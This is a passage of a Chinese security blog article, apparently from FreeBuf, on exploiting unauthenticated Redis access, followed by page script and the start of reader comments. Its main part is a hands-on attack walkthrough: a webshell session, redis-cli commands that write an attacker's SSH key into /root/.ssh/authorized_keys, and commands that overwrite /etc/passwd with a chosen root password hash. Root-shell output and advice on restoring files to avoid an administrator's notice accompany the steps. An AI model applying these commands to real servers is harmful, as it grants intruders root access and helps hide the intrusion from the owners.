<pre><code><p>$./weevely.py<a href="http://192.168.56.101/info.php" rel="nofollow">http://192.168.56.101/info.php</a> yourpasswd<span style="background-color: transparent;">&nbsp;</span></p><p>[+] weevely 3.4</p><p>[+] Target:&nbsp;&nbsp;&nbsp; 192.168.56.101</p><p>[+] Session:&nbsp;&nbsp; /home/yang/.weevely/sessions/192.168.56.101/info_0.session</p><p>[+] Browse the filesystem or executecommands starts the connection</p><p>[+] to the target. Type :help formore information.</p><p>&nbsp;<span style="background-color: transparent;">weevely&gt; id</span></p><p>uid=33(www-data) gid=33(www-data)groups=33(www-data)</p><p>www-data@lamp:/var/www $ ifconfig</p><p>eth0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Link encap:Ethernet&nbsp; HWaddr 08:00:27:93:68:78&nbsp;</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inet addr:192.168.56.101&nbsp; Bcast:192.168.56.255&nbsp; Mask:255.255.255.0</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; ...</p></code></pre>
</p>
<p>获取低权账号主机访问权，下一步，提权，这属于后渗透阶段，见另文。</p>
<p>最后记得清除痕迹：恢复 rdbcompression、dir、dbfilename先前设置，删除创建的键/值 info。</p>
<p>回顾整个过程，漏了个关键点，web 根目录。是的，演示环境的 web 根目录为 /var/www，但真实环境中往往复杂得多，你得综合考虑操作系统（linux、win）、web 容器、子目录等等多因素，才可能猜测出正确的路径，就像 sqlmap 中那样：</p>
</p>
<pre><code><p>class ABSPATH_PREFIXES:</p><p>&nbsp;&nbsp;&nbsp;LINUX = (</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "/var/www","/usr/local/apache", "/usr/local/apache2","/usr/local/www/apache22", "/usr/local/www/apache24",</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "/usr/local/httpd","/var/www/nginx-default", "/srv/www","/var/www/vhosts",</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "/var/www/virtual","/var/www/clients/vhosts", "/var/www/clients/virtual")</p><p>&nbsp;&nbsp;&nbsp;WINDOWS = (</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "/xampp", "/ProgramFiles/xampp", "/wamp", "/Program Files/wampp","/apache",</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "/Program Files/ApacheGroup/Apache",</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "/Program Files/ApacheGroup/Apache2", "/Program Files/Apache Group/Apache2.2",</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "/Program Files/ApacheGroup/Apache2.4", "/Inetpub/wwwroot",</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "/Inetpub/vhosts")</p><p>&nbsp;&nbsp;&nbsp;ALL = LINUX + WINDOWS</p><p><br /></p><p># Suffixes used in brute force searchfor web server document root</p><p>ABSPATH_SUFFIXES = ("html","htdocs", "httpdocs", "php", "public","src", "site", "build", "web","www", "data", "sites/all","www/build")</p></code></pre>
</p>
<p>如果暴破不出来，可以考虑寻找 web 应用的目录遍历漏洞，或者，web 容器自身的目录遍历漏洞（如，apache tomcat utf-8 目录遍历漏洞，CVE-2008-2938）。</p>
<h3><b>写 /root/.ssh/authorized_keys 文件实现 ssh 免密登录</b></h3>
<p>借助 redis 写文件的能力，将攻击端的公钥写入目标端的 /root/.ssh/authorized_keys中，可实现 ssh 免密登录。</p>
<p>具体而言，假定你通过各自手段已获取 192.168.56.101 的 redis 访问权限，我们要将文件路径改为 /root/.ssh/authorized_keys，为防止业务异常或被管理员发现，通常事后应恢复先前设置，所以，首先，记录下当前设置的目录和文件名信息：</p>
</p>
<pre><code><p>192.168.56.101:6379&gt; CONFIG GETdir</p><p>1) "dir"</p><p>2) "/tmp"</p><p>192.168.56.101:6379&gt; CONFIG GETdbfilename</p><p>1) "dbfilename"</p><p>2) "dump.rdb"</p></code></pre>
</p>
<p>记录下当前是否压缩：</p>
</p>
<pre><code><p>192.168.56.101:6379&gt; CONFIG GETrdbcompression</p><p>1) "rdbcompression"</p><p>2) "yes"</p></code></pre>
</p>
<p>接着，更改目录为 ssh 配置文件所在目录：</p>
</p>
<pre><code><p>192.168.56.101:6379&gt; CONFIG SETdir /root/.ssh/</p><p>OK</p></code></pre>
</p>
<p>若非 root 部署 redis，或者/root/.ssh/ 不存在，将出现如下报错，你应考虑其他攻击手法（写 webshell 是个不错的选择）：</p>
</p>
<pre><code>(error) ERR Changing directory: Nosuch file or directory</code></pre>
</p>
<p>确认是否更改成功：</p>
</p>
<pre><code><p>192.168.56.101:6379&gt; CONFIG GETdir</p><p>1) "dir"</p><p>2) "/root/.ssh"</p><p></p></code></pre>
<p>设置将要待写文件名：</p>
</p>
<pre><code><p>192.168.56.101:6379&gt; CONFIG SETdbfilename authorized_keys</p><p>OK</p></code></pre>
</p>
<p>然后，创建键为 abcd、值为攻击端公钥的键/值对：</p>
</p>
<pre><code><p>192.168.56.101:6379&gt; SET abcd"\n\n ssh-rsaMMMdjfeod29jdlsMMMMPMQMBMMMBMQPcLMUOEN8xETqsfklfj5kfLZebMEopPcYTP1uJeOB1Oc+IML+xMGcsdfjsdfjdfsdfkdfjwodOEFsfdhlsFKDSFHsldkjfdlekasdjfssaldjfsadlfsadfasdsdfsadfjsoaiV+LxUpLvE+bPw2CIdkfdsd8W/XGsadfjk92flsllSk/PlTasdfkjlweijsadflksajdfdkfasdfssaldiejflDSKs+asjfiewflofdjkidsfoiwjhsaLDJHFUEWKFHSKDSDFJKASDHU2w1l/fcsfdjW/eWsa+j35WsadfMS76QI2+VkPwPsdfOFMP+gC8+2Faf1yangyangwithgnu@host \n\n" NX</p><p>OK</p></code></pre>
</p>
<p>随后，保存，间接实现将公钥写入 authorized_keys：</p>
</p>
<pre><code><p>192.168.56.101:6379&gt; save</p><p>OK</p></code></pre>
</p>
<p>最后，恢复先前的目录、文件名、压缩状态，删除创建的键/值：</p>
</p>
<pre><code><p>192.168.56.101:6379&gt; CONFIG SETdir "/tmp"</p><p>OK</p><p>192.168.56.101:6379&gt; CONFIG SETdbfilename "dump.rdb"</p><p>OK</p><p>192.168.56.101:6379&gt; CONFIG SETrdbcompression yes</p><p>OK</p><p>192.168.56.101:6379&gt; DEL abcd</p><p>(integer) 1</p></code></pre>
<p>尝试 ssh 免密登录成功：</p>
</p>
<pre><code><p>$ ssh root@192.168.56.101</p><p>Last login: Sat Aug 19 11:16:13 2017from 192.168.56.123</p><p>root@HomePortalSystem:~# id&nbsp;&nbsp;&nbsp;</p><p>uid=0(root) gid=0(root)groups=0(root)</p></code></pre>
<p>当然，也不是说将公钥写入 authorized_keys 就一定能免密登录，至少得满足，攻击端网络环境可以正常访问目标端的 ssh 服务、目标端允许 root 远程登录、允许免密登录等条件，甚至 ssh 是否启在 22 端口？iptable是否限制访问源 IP 等等相关信息都得综合考虑。</p>
<h3><b>写 /etc/passwd 文件实现任意账号密码重置</b></h3>
<p>你知道，真正存放密码的文件是 /etc/shadow 而非 /etc/passwd，若一个账号同时在 /etc/passwd 和 /etc/shadow 中出现存放了密码，会出现什么情况？系统以前者为准。换言之，我们可以用 redis 写文件的能力，将自定义的 root 密码写入 /etc/passwd，随后便可以此已知密码登录 root 账号。</p>
<p>既然 redis 未授权漏洞可以写任意文件，为何选择写 /etc/passwd 而不直接写 /etc/shadow 呢？redis 是以覆盖模式写文件，无法追加，假设系统原来有 8 个账号，除了 root 外你不可能知道其他 7 个账号名，redis 写入root 的密码的同时，也就删除了其他 7 个账号，这个过程是有创且不可逆的。自然，我需要在真正写文件前，查看到该文件当前内容，以便事后恢复。/etc/passwd 和 /etc/shadow 哪个更有可能被查看内容？前者权限为 644、后者为 640，肯定是前者。常见的场景，比如该机器部署的 web 存在任意文件下载漏洞，又如你通过任意文件上传拿到 webshell，都可以获取 /etc/passwd 内容。所以，我认为 /etc/passwd 更合适。另外，如果实在是无法事前查看文件 /etc/passwd 内容，你也别不干下手，结合 /etc/passwd- 和 /etc/shadow 仍可恢复 99% 的内容。/etc/passwd- 是 /etc/passwd 的上个版本备份，相较当前版本可能缺少一个账号，先将 /etc/passwd- 拷贝为 /etc/passwd，再从 /etc/shadow 中提取缺失的那个账号名（如 yang），手工追加至 /etc/passwd。这样，入侵前后的 /etc/passwd 基本一至。</p>
</p>
<pre><code><p>/etc/passwd格式如下：</p><p>yang:x:1000:1000::/home/yang:/bin/sh</p><p>/etc/shadow格式为：</p><p>yang:$6$3fsk3de0$RAG5fct2ldQbmeb0e98nm4/EacrpdWHzpKW9ftz01np2uxPVV6B60EqCdMewopLPIC/pPUTybAVnfk9rJ8UGH/:17386:0:99999:7:::</p></code></pre>
</p>
<p>均采用分号（:）作为分隔符，第一个字段为用户名，第二个字段为哈希密码。/etc/passwd 的哈希密码为 x，表示以 /etc/shadow 中的为准。哈希密码字段内部又用 $ 分割为三部分，依次为：算法代号、盐值、哈希值。算法代号，linux 规定 1 代表 MD5、2a 代表老版 blowfish、2y 为新版blowfish、5 代表 SHA-256、6 代表 SHA-512，其他unix-like 可能不一样；盐值，用于防止基于彩虹表的哈希破解，只能为大小写字符或数字，不同类型的算法，盐值长度要求不一，比如，sha-512 要求盐值为 8 到 16位字符，而 DES 要求只能是 2 位；哈希值，通过哈希算法对明文密码和盐值进行加密计算的结果。另外，也可以借助 hashID（ <a href="https://github.com/psypanda/hashID">https://github.com/psypanda/hashID</a>）和hash-algorithm-identifier（<a href="https://github.com/AnimeshShaw/Hash-Algorithm-Identifier">https://github.com/AnimeshShaw/Hash-Algorithm-Identifier</a> <span style="font-size: 11pt;">）自动识别哈希算法类型。</span></p>
</p>
<p>无法查看 /etc/shadow，如何确定系统采用哪种哈希算法？这，不重要！通常来说，不同发行套件默认采用的哈希算法可能不同，但均支持 MD5、SHA-256、SHA-512等三种，换言之，三种任选其一均可。已实现这三种哈希算法的工具很多，比如，系统命令 mkpasswd：</p>
</p>
<pre><code>$ mkpasswd --method=md5--salt='my0salt0' 'YourNewPasswd%1024'</code></pre>
</p>
<p>其中，密码明文为 YourNewPasswd%1024，盐值 my0salt0，采用 MD5 算法（&#8211;method=help 查看完整列表）；又如，python 的 crypt 库：</p>
</p>
<pre><code>$ python -c 'import crypt; print crypt.crypt("YourNewPasswd%1024","$6$my0salt0")'</code></pre>
</p>
<p>其中，密码明文为 YourNewPasswd%1024，盐值 my0salt0，采用代号为 6 的 SHA-512 算法。</p>
<p>既然我们已经获得 redis 控制权，且 /etc/passwd 具有较强容错性，那么，通过写入 root 账号的哈希密码到 /etc/passwd 中，实现 root 密码重置是完全可行的。</p>
<p>假定重置 root 密码为 YourNewPasswd%1024（linux 一般有密码强度规则，为规避未知因素导致密码重置失败，新密码应满足较强的密码规则，如长度超过 8 位、含有大小写字母、数字、特殊字符），先计算出该密码的哈希：</p>
</p>
<pre><code><p>$ mkpasswd --method=sha-512--salt='my0salt0' 'YourNewPasswd%1024'</p><p>$6$my0salt0$yCCi..OsWo8n5MaBFytGaZ0qTcHErSaoyvAVvMXFEnwgMOtpm6sYbtwUR4I.GA7Kt0X0KruYifS6c9.FkDN53.</p></code></pre>
</p>
<p>接着，参照前面写 /root/.ssh/authorized_keys 文件步骤，记录下当前环境、删除可以键/值、设置禁止压缩；然后，设置写文件路径：</p>
</p>
<pre><code><p>192.168.56.101:6379&gt; CONFIG SETdir /etc/</p><p>OK</p><p>192.168.56.101:6379&gt; CONFIG SETdbfilename passwd</p><p>OK</p></code></pre>
</p>
<p>要想 SSH 登录，我们不能只写入 root 账号，sshd 账号也得写入：</p>
</p>
<pre><code><p>192.168.56.101:6379&gt; SET abcd"\n\n root:$6$my0salt0$yCCi..OsWo8n5MaBFytGaZ0qTcHErSaoyvAVvMXFEnwgMOtpm6sYbtwUR4I.GA7Kt0X0KruYifS6c9.FkDN53.:0:0:root:/root:/bin/bash\nsshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin\n\n" NX</p><p>OK</p><p>192.168.56.101:6379&gt; save</p><p>OK</p><p></p></code></pre>
<p>查看 /etc/passwd：</p>
</p>
<pre><code><p># xxd passwd</p><p>0000000: 5245 4449 5330 3030 38fa0972 6564 6973&nbsp; REDIS0008..redis</p><p>0000010: 2d76 6572 0534 2e30 2e31fa0a 7265 6469&nbsp; -ver.4.0.1..redi</p><p>0000020: 732d 6269 7473 c040 fa056374 696d 65c2&nbsp; s-bits.@..ctime.</p><p>0000030: 46d8 a359 fa08 7573 65642d6d 656d c2a8&nbsp; F..Y..used-mem..</p><p>0000040: a10c 00fa 0c61 6f66 2d707265 616d 626c&nbsp; .....aof-preambl</p><p>0000050: 65c0 00fa 0772 6570 6c2d6964 2838 3064&nbsp; e....repl-id(80d</p><p>0000060: 3166 3935 6562 6130 38333236 3433 3137&nbsp; 1f95eba083264317</p><p>0000070: 6461 3835 3338 6235 31643863 3235 3230&nbsp; da8538b51d8c2520</p><p>0000080: 3937 6365 38fa 0b72 65706c2d 6f66 6673&nbsp; 97ce8..repl-offs</p><p>0000090: 6574 c000 fe00 fb04 00000566 6f75 7273&nbsp; et.........fours</p><p>00000a0: c309 2601 3434 e019 00013434 0004 6162&nbsp; ..&amp;.44....44..ab</p><p>00000b0: 6364 40b8 0a0a 2072 6f6f743a 2436 246d&nbsp; cd@... <b>root:$6$m</b></p><p>00000c0: 7930 7361 6c74 3024 644d5442 6f4a 5357&nbsp; <b>y0sadlt0$yCCi..O</b></p><p>00000d0: 4470 4f50 6b5a 6869 304e7a39 6465 3336&nbsp; <b>sWo8n5MaBFytGaZ0</b></p><p>00000e0: 5369 4a78 4345 5559 4671316b 3970 3733&nbsp; <b>qTcHKErSaoyvAVvM</b></p><p>00000f0: 7449 3738 7172 7445 71354735 4235 367a&nbsp; <b>tI78qrtEq5G5B56z</b></p><p>0000100: 7376 6e44 5444 6f4c 7241635a 4356 5a6e&nbsp; <b>svnDTdfwkj2JCVZn</b></p><p>0000110: 6f74 6a5a 4c58 6954 6d517a30 6c2e 3a30&nbsp; <b>oke6c9.FkDN53.:0</b></p><p>0000120: 3a30 3a72 6f6f 743a 2f726f6f 743a 2f62&nbsp; <b>:0:root:/root:/b</b></p><p>0000130: 696e 2f62 6173 680a 73736864 3a78 3a31&nbsp; <b>in/bash.sshd:x:1</b></p><p>0000140: 3038 3a36 3535 3334 3a3a2f76 6172 2f72&nbsp; <b>08:65534::/var/r</b></p><p>0000150: 756e 2f73 7368 643a 2f757372 2f73 6269&nbsp; <b>un/sshd:/usr/sbi</b></p><p>0000160: 6e2f 6e6f 6c6f 6769 6e200a0a 0002 6161&nbsp; <b>n/nologin</b> ....aa</p><p>0000170: 0166 0001 6102 6464 ffdb1772 3902 cde3&nbsp; .f..a.dd...r9...</p><p>0000180: de&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .</p></code></pre>
</p>
<p>root所在行的第二个字段已从先前的 x 变为 YourNewPasswd%1024 对应的哈希，尝试用该密码 SSH 登录 root 成功：</p>
</p>
<pre><code><p>$ ssh 192.168.56.101</p><p>root@192.168.56.101's password:</p><p>Welcome to Lamp, TurnKey GNU/Linux14.1 / Debian 8.9 Jessie</p><p>Last login: Mon Aug 28 01:23:30 2017from 192.168.56.104</p><p>root@lamp ~$ id</p><p>uid=0(root) gid=0(root)groups=0(root)</p></code></pre>
</p>
<p>前面提过，由于 redis 只能按覆盖模式写文件而无法追加，这种入侵方式将破坏 /etc/passwd原始内容，所以成功登录系统后务必尽早恢复 /etc/passwd，不然，轻则引起管理员注意，重则影响业务正常运行。先从 /etc/passwd- 恢复绝大部分内容：</p>
</p>
<pre><code><p>$ cp /etc/passwd- /etc/passwd</p><p>$ cat /etc/passwd</p><p>root:x:0:0:root:/root:/bin/bash</p><p>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</p><p>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</p><p>...</p><p>mongodb:x:112:65534::/home/mongodb:/bin/false</p><p>yang:x:1000:1000::/home/yang:/bin/sh</p><p>memcache:x:113:120:Memcached,,,:/nonexistent:/bin/false</p></code></pre>
</p>
<p>再从 /etc/shadow 找到缺失的账号 wawa：</p>
</p>
<pre><code><p>$ cat /etc/passwd- | cut -d ':' -f 1&gt; a.txt &amp;&amp; cat /etc/shadow | cut -d ':' -f 1 &gt; b.txt &amp;&amp;diff a.txt b.txt</p><p>34d33</p><p>&gt; wawa</p></code></pre>
</p>
<p>手工追加 wawa 至 /etc/passwd：</p>
</p>
<pre><code>wawa:x:1002:1002:,,,:/home/wawa:/bin/bash</code></pre>
</p>
<p>整个过程完成。</p>
<p>现在我们已经实现将 root 密码重置为 YourNewPasswd%1024，如果运气好（目标端开启 SSH 服务、允许 root 直登），这带来的短期效益是可以 SSH 登录该机器获得 root 访问权。如，尝试用 root/ YourNewPasswd%1024 进行 SSH 登录成功：</p>
</p>
<pre><code><p>$ ssh root@192.168.56.101</p><p>root@192.168.56.101's password:</p><p>Welcome to Lamp, TurnKey GNU/Linux14.1 / Debian 8.9 Jessie</p><p>...</p><p>Last login: Fri Sep&nbsp; 1 21:57:26 2017 from 192.168.56.104</p><p>root@lamp ~# id</p><p>uid=0(root) gid=0(root)groups=0(root)</p></code></pre>
</p>
<p>如果运气坏，即便密码重置成功也无法登录：</p>
</p>
<pre><code><p># ssh 192.168.56.101</p><p>root@192.168.56.101's password:</p><p>Permission denied, please try again.</p></code></pre>
</p>
<p>导致这种结果的原因很多，常见几类：管理员在 /etc/ssh/sshd_config 中将 PermitRootLogin 置为 no 以禁止 root 直登，或者，管理员在 /etc/shadow 文件的 root:!$6$rWDSG&#8230;Hsi1:15347:0:9999:7::: <span style="font-size: 11pt;">中的哈希密码字段前增加了 ! 以锁定该账号，或者，管理员在 /etc/hosts.allow 中限定了可访问该机器的源 IP 白名单等等。没关系，长远来看，我们掌握了 root 密码，结合其他漏洞，也有很大几率入侵成功，如，该机器的 web 应用存在命令注入漏洞，基于此可以获得运行 web 容器的账号 apache 的shell，由于知道 root 密码，所以可 su root 获得 root 控制权；又如，系统只是禁止 root 登录，并未禁止其他账号登录，只要（通过其他漏洞）你已经掌握了该机器除 root 外的其他账号名，那么完全同时重置 root 和其他账号的密码，先登录其他账号再 su root 即可。入侵打的是组合拳，把思维发散开，终会有路。</span></p>
<p><b><span style="color: rgb(239, 71, 71);">*本文原创作者：yangyangwithgnu@yeah.net（<a href="https://yangyangwithgnu.github.io/" target="_blank">blog</a>），属于FreeBuf原创奖励计划，禁止转载</span></b></p>
                                                    </div>
                        <div class="article-oper article-oper-new">
                            <style>
                                @font-face {font-family: 'iconfont';
                                    src: url('http://static.3001.net/iconfonts/iconfont.eot'); /* IE9*/
                                    src: url('http://static.3001.net/iconfonts/iconfont.eot?#iefix') format('embedded-opentype'), /* IE6-IE8 */
                                    url('http://static.3001.net/iconfonts/iconfont.woff') format('woff'), /* chrome、firefox */
                                    url('http://static.3001.net/iconfonts/iconfont.ttf') format('truetype'), /* chrome、firefox、opera、Safari, Android, iOS 4.2+*/
                                    url('http://static.3001.net/iconfonts/iconfont.svg#iconfont') format('svg'); /* iOS 4.1- */
                                }
                            </style>
                            <div class="share-new clearfix">
                                <div class="share-author">
                                                                            <a href="http://www.freebuf.com/author/yangyangwithgnu" title="由 yangyangwithgnu 发布" rel="author">
                                            <img src="http://image.3001.net/images/20170922/1506075605316.jpg!video" width="0" height="0" alt="yangyangwithgnu" class="avatar avatar-50 wp-user-avatar wp-user-avatar-50 photo" />                                            <!--							<img src="http://image.3001.net/2015/06/17.jpg" alt="ArthurKiller">-->
                                        </a>
                                        <div class="share-author-info">
                                                                                        <a class="author-name" href="http://www.freebuf.com/author/yangyangwithgnu">yangyangwithgnu</a>
                                            <!--<span class="icon-f"></span>-->
                                            <span>
                                <i class="colour-red">
                                    1                                </i>
                                篇文章</span>
                                            <span>等级：
                                <i class="colour-green">2</i>级
                            </span>
                                        </div>
                                                                                                        </div>
                                <div class="user-center clearfix">
                                                                            <a href="http://www.freebuf.com/author/yangyangwithgnu" data-toggle="tooltip" data-placement="top" title="个人主页" class="home" target="_blank"></a>
                                                                        <a href="http://www.freebuf.com/user/pm?pmaction=newmessage&to=yangyangwithgnu" data-toggle="tooltip" data-placement="top" title="私信" class="letter" target="_blank"></a>
                                </div>
                                <div class="share-ctrl clearfix">
                                                                        <div class="bdsharebuttonbox clearfix bdshare-button-style1-24 columnstatus"
                                         data-bd-bind="1489991449190" data-column="" data-title="不请自来 | Redis 未授权访问漏洞深度利用" data-name="">
                                        <a href="#" data-toggle="tooltip" data-placement="top" data-cmd="tsina" title="分享到新浪微博" id="tsina"></a>
                                        <a href="#" data-toggle="tooltip" data-placement="top" data-cmd="weixin" title="分享到微信" id="weixin"></a>
                                        <a href="#" data-toggle="tooltip" data-placement="top" data-cmd="qzone" title="分享到QQ空间" id="qzone"></a>
                                       <!-- _shareUrlWeibo = 'http://service.weibo.com/share/share.php?url=http://'+encodeURIComponent(_json[i].url)+'&title='+encodeURIComponent(_json[i].title)+'-FreeBuf涓撴爮路'+_json[i].columnName;
                                        _shareUrlZone = 'http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://'+encodeURIComponent(_json[i].url)+'&title='+_json[i].title+'-FreeBuf涓撴爮路'+_json[i].columnName;
                                        _shareSrc = 'http://s.jiathis.com/qrcode.php?url=http://'+_json[i].url;-->
                                        <span class="share-line">|</span>
                                    </div>
                                </div>
                                <div class="user-ctrl clearfix">
                                                                            <a href="http://www.freebuf.com/oauth" id="collect" data-toggle="tooltip" data-placement="top" title="收藏" ></a>
                                                                        <a href="#respond" data-toggle="tooltip" data-placement="top" title="评论" id="comments"></a>
                                                                        <!--					<a href="#" title="文章纠正">&#xe6e3;</a>-->
                                    <span class="share-line">|</span>
                                    <span class="info-alert"></span>
                                </div>
                            </div>
                            <script>
                                var column = $('.columnstatus').attr('data-column');
                                var text = '';
                                if(column){
                                    var title = $('.columnstatus').attr('data-title');
                                    var name = $('.columnstatus').attr('data-name');
                                    text = title+' - FreeBuf专栏·'+name;
                                }
                                window._bd_share_config={
                                    "common": {
                                        "bdSnsKey": {},
                                        "bdText": text,
                                        "bdMini": "2",
                                        "bdMiniList": ["qzone", "tsina", "weixin"],
                                        "bdPic": "",
                                        "bdStyle": "1",
                                        "bdSize": "24"
                                    },
                                    "share":{},
                                };
                                with(document)0[
                                    (getElementsByTagName('head')[0]||body).
                                    appendChild(createElement('script')).
                                        src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)
                                    ];
                                //控制垂直方向分享模块的定位
                                function shareFixVertical(){
                                    var offsetTop = jQuery(".article-oper").get(0).offsetTop;
                                    var win_h = jQuery(window).height();
                                    var win_w = jQuery(window).width();
                                    var scrollTop = document.body.scrollTop||document.documentElement.scrollTop;
                                    var _height = offsetTop-scrollTop;
                                    var _flag = $('.column-article').attr('data-column');
                                    if(_flag == 1) {
                                        if(_height>=win_h-660&&win_w>975){
                                            var _width = jQuery("#getWidth").innerWidth()-30;
                                            var _left = jQuery("#getWidth").offset().left+15;
                                            jQuery(".share-new").addClass("fixed");
                                            jQuery(".fixed").css({
                                                width:_width,
                                                left:_left
                                            });

                                        }else{
                                            jQuery(".share-new").removeClass("fixed");
                                            jQuery(".share-new").css({
                                                width: "100%"
                                            });
                                        }
                                    }else {
                                        if(_height>=win_h-255&&win_w>975){
                                            var _width = jQuery("#getWidth").innerWidth()-30;
                                            var _left = jQuery("#getWidth").offset().left+15;
                                            jQuery(".share-new").addClass("fixed");
                                            jQuery(".fixed").css({
                                                width:_width,
                                                left:_left
                                            });

                                        }else{
                                            jQuery(".share-new").removeClass("fixed");
                                            jQuery(".share-new").css({
                                                width: "100%"
                                            });
                                        }
                                    }
                                }
                                //控制水平方向分享模块的定位
                                function shareFixHorizontal(){
                                    var _width = jQuery("#getWidth").innerWidth()-30;
                                    var _left = jQuery("#getWidth").get(0).offsetLeft+15;
                                    var win_w = document.documentElement.clientWidth || document.body.clientWidth;
                                    jQuery(".fixed").css({
                                        width:_width,
                                        left:_left
                                    });
                                    if(win_w< 975){
                                        jQuery(".share-new").css({
                                            width: "100%",
                                            left: "0"
                                        });
                                    }else{
                                        var _width = jQuery("#getWidth").innerWidth()-30;
                                        var _left = jQuery("#getWidth").get(0).offsetLeft+15;
                                        jQuery(".fixed").css({
                                            width:_width,
                                            left:_left
                                        });
                                    }
                                }
                                function click(){
                                    var _w = jQuery(window).width();
                                    jQuery(document).click(function(e){
                                        if(jQuery(e.target).attr("id")=="weixin"){
                                            if(_w <= 760) {
                                                jQuery("#bdshare_weixin_qrcode_dialog").hide();
                                                layer.open({
                                                    title: '提示',
                                                    btnAlign: 'c',
                                                    content: '请使用手机浏览器自带的分享功能分享该页面',
                                                    area: '260px'
                                                });
                                            }else {
                                                jQuery("#bdshare_weixin_qrcode_dialog").show();
                                            }
                                        }else {
                                            jQuery("#bdshare_weixin_qrcode_dialog").hide();
                                        }
                                    });
                                }

                                jQuery(window).on("load",function(){
                                    shareFixVertical();
                                    click();
                                });

                                jQuery(window).on("scroll",function(){
                                    //判断滚轮方向
                                    var agent = navigator.userAgent;
                                    if (/.*Firefox.*/.test(agent)) {
                                        document.addEventListener("DOMMouseScroll", function(e) {
                                            e = e || window.event;
                                            var detail = e.detail;
                                            if (detail > 0) {
                                                $(".share-new").removeClass("fixed");
                                                $(".share-new").css({
                                                    width: "100%"
                                                });
                                                $('.main-header .header').removeClass('op1');
                                                $('.main-header .header').addClass('op0');
                                            } else {
                                                shareFixVertical();
                                                $('.main-header .header').removeClass('op0');
                                                $('.main-header .header').addClass('op1');
                                            }
                                        });
                                    } else {
                                        document.onmousewheel = function(e) {
                                            e = e || window.event;
                                            var wheelDelta = e.wheelDelta;
                                            if (wheelDelta > 0) {
                                                shareFixVertical();
                                                $('.main-header .header').removeClass('op0');
                                                $('.main-header .header').addClass('op1');
                                            } else {
                                                $(".share-new").removeClass("fixed");
                                                $(".share-new").css({
                                                    width: "100%"
                                                });
                                                $('.main-header .header').removeClass('op1');
                                                $('.main-header .header').addClass('op0');
                                            }
                                        }
                                    }
                                });


                                jQuery(window).on("resize",function(){
                                    shareFixHorizontal();
                                    click();
                                })

                                //tooltips提示
                                $(function () { $("[data-toggle='tooltip']").tooltip(); });
                            </script>
                        </div>
                                                                                                                            <div class="article-pager ">
                                <ul>
                                    <li class="previous"><span>上一篇：</span><a href="http://www.freebuf.com/vuls/148257.html" rel="prev">我是如何通过CSRF拿到Shell的</a>                                    </li>
                                    <li class="next"><span>下一篇：</span>
                                        <a href="javascript:viod(0);" rel="next">本篇已是最新文章</a>                                    </li>
                                </ul>
                            </div>
                                            </div>
                </div>
                <div class="comment-list">
      <div class="main-tit02">
		<a rel="nofollow" class="btnbtn-default btn-comment" href="#respond">发表评论</a>
        <h3>已有 <span class="color_red">11</span> 条评论
      </div>
      <ul>
         <li class="comment even thread-even depth-1" id="li-comment-230605">
    <div id="comment-230605">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic17.png">     </div>
    <div class="tit"> 
	    <span class="name"> 2333333333333 </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2017-09-25</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-230605','230605', 'respond','148758' ) " href="?replytocom=230605#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">1楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>前排围观大佬</p>
<div class="comment-tools">
<div class="vote" id="vote-230605"><span id="acv_stat_230605"></span><a class="ilike_icon"  id="vote4-230605" href="javascript:acv_vote(230605,1);">亮了</a>(<span id="cos_support-230605">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="230605" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="230605" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="230605" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="230605" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="230605" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment odd alt thread-odd thread-alt depth-1" id="li-comment-230606">
    <div id="comment-230606">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic15.png">     </div>
    <div class="tit"> 
	    <span class="name"> 老阿訇 </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2017-09-25</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
